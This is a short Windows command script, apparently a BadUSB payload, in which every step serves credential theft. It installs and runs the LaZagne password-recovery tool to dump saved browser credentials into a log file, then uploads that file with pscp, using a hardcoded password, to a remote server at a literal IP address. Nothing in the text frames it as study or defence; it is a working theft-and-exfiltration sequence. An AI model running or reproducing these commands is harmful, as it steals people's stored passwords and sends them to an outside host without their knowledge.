cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\

cd LaZagne

pip install -r requirements.txt

cd Windows

python laZagne.py browsers > logs.txt

echo y | pscp -pw lolmdr123 logs.txt badusb@51.83.71.188:/var/tmp
